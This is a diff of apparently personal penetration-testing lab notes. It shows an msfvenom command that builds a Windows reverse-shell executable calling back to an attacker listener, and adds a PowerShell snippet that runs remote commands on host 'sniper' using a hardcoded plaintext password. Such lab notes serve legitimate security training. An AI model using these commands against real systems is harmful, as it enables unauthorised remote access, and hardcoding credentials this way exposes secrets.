@@ -57,3 +57,11 @@ https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-meta
 
 root@Kali:~/PTP/2.5_Exploitation/Lab 4# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.73 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe
 ```
+###windows
+```
+$Cred = Get-Credential -UserName domain\user -Message 'Enter Password'
+$securePassword = ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential "sniper\chris", $securepassword
+Invoke-Command -ComputerName sniper -Credential $credential -ScriptBlock {whoami}
+
+```
